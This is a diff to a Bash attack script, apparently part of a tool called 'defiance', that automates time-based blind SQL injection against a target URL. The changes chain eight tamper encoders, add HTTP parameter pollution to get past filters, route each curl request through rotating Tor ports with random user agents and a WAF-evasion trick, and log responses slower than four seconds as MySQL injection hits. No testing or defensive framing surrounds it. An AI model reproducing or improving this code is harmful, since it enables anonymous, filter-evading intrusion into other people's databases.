@@ -71,10 +71,10 @@ vector_sqli_agressor_left() {
         [[ -z "$default_path" ]] && continue
         
         local random_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
-        if [ -n "$custom_proxy" ]; then local proxy_flag="-x $random_port"; 
-else 
-local proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"; fi
+        if [ -n "$custom_proxy" ]; then local proxy_flag="-x $random_port --fail"; else local proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"; fi
         local random_ua=${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}
+
+        # === KOMBO 8 TAMPER INTEGRASI PORTABLE ===
         local t1=$(between_engine "$default_path")
         local t2=$(charencode_engine "$t1")
         local t3=$(apostrophenullencode_engine "$t2")
@@ -83,16 +83,23 @@ local proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec -
         local t6=$(appendnullbyte_engine "$t5")
         local t7=$(xor_engine "$t6")
         local defiance_tamper_path=$(weirdcomment_engine "$t7")
+        local final_query=""
+        if [[ "$defiance_tamper_path" == *"="* ]]; then
+            local param_name=$(echo "$defiance_tamper_path" | cut -d'=' -f1)
+            local param_val=$(echo "$defiance_tamper_path" | cut -d'=' -f2-)
+            final_query="${param_name}=999&${param_name}=${param_val}${query_payload}"
+        else
+            final_query="${defiance_tamper_path}${query_payload}"
+        fi
         
-        local final_query="${defiance_tamper_path}${query_payload}"
         local waf_trick=$(braindamage)
-
-        echo -e "\e[0;33m[ \e[0m:\e[0;34m) ]\e[0m Vector 1 [Port:$random_port] Probing Latency on: \e[0;34m$target_url$final_query\e[0m"
+        
+        echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Vector 1 [Port:$random_port] Probing Latency on: \e[1;34m$target_url$final_query\e[0m"
         
         local stopwatch=$(curl $proxy_flag $waf_trick -m 12 -A "$random_ua" -s -o /dev/null -w "%{time_total}" "$target_url$final_query")
-
+        
         if (( $(echo "$stopwatch > 4.0" | bc -l) )); then
-            echo -e "    \e[0;31m[!+!]\e[0m Vector 1 MySQL Anomaly: ${stopwatch}s"
+            echo -e "    \e[0;31m[!+!]\e[0m Vector 1 confirmed MySQL Anomaly: ${stopwatch}s"
             echo "SQLI_ALERT|$default_path|$query_payload" >> "$ROOT_LOG_FILE"
         fi
         sleep 5
@@ -106,10 +113,8 @@ vector_sqli_agressor_right() {
         [[ -z "$default_path" ]] && continue
         
         local random_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
-        if [ -n "$custom_proxy" ]; then local proxy_flag="-x $random_port"; 
-else 
-local proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"; fi
-        local random_ua=${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}               
+        if [ -n "$custom_proxy" ]; then local proxy_flag="-x $random_port --fail"; else local proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"; fi
+        local random_ua=${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}
         local t1=$(between_engine "$default_path")
         local t2=$(charencode_engine "$t1")
         local t3=$(apostrophenullencode_engine "$t2")
@@ -118,16 +123,24 @@ local proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec -
         local t6=$(appendnullbyte_engine "$t5")
         local t7=$(xor_engine "$t6")
         local defiance_tamper_path=$(weirdcomment_engine "$t7")
-        
-        local final_query="${defiance_tamper_path}${query_payload}"
-        local waf_trick=$(braindamage)
 
-        echo -e "\e[0;33m[ \e[0m:\e[0;34m) ]\e[0m Vector 2 [Port:$random_port] Probing Latency on: \e[0;34m$target_url$final_query\e[0m"
+        local final_query=""
+        if [[ "$defiance_tamper_path" == *"="* ]]; then
+            local param_name=$(echo "$defiance_tamper_path" | cut -d'=' -f1)
+            local param_val=$(echo "$defiance_tamper_path" | cut -d'=' -f2-)
+            final_query="${param_name}=999&${param_name}=${param_val}${query_payload}"
+        else
+            final_query="${defiance_tamper_path}${query_payload}"
+        fi
+        
+        local waf_trick=$(braindamage)
+        
+        echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Vector 2 [Port:$random_port] Probing Latency on: \e[1;34m$target_url$final_query\e[0m"
         
         local stopwatch=$(curl $proxy_flag $waf_trick -m 12 -A "$random_ua" -s -o /dev/null -w "%{time_total}" "$target_url$final_query")
         
         if (( $(echo "$stopwatch > 4.0" | bc -l) )); then
-            echo -e "    \e[0;31m[!+!]\e[0m Vector 2 MySQL Anomaly: ${stopwatch}s"
+            echo -e "    \e[0;31m[!+!]\e[0m Vector 2 confirmed MySQL Anomaly: ${stopwatch}s"
             echo "SQLI_ALERT|$default_path|$query_payload" >> "$ROOT_LOG_FILE"
         fi
         sleep 5
